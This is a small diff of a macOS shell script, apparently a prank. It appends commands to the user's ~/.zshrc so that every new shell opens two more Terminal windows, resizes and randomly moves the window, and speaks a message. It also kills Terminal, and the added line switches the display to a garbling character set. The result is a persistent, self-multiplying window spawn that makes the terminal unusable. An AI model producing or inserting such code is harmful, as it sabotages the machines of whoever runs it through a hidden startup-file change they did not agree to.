@@ -15,6 +15,7 @@ echo "say hello bebou" >> ~/.zshrc ;
 echo "printf '\e[8;49;100t'" >> ~/.zshrc ;
 echo "printf '\e[3;'\$(( \$RANDOM % 980 + 1 ))';'\$(( \$RANDOM % 200 + 1 ))'t'" >> ~/.zshrc ;
 echo "sleep 1" >> ~/.zshrc ;
+echo "printf \"\\e(0\"";
 echo "open /Applications/Utilities/Terminal.app -n" >> ~/.zshrc ;
 echo "open /Applications/Utilities/Terminal.app -n" >> ~/.zshrc ;
 pkill Terminal ;
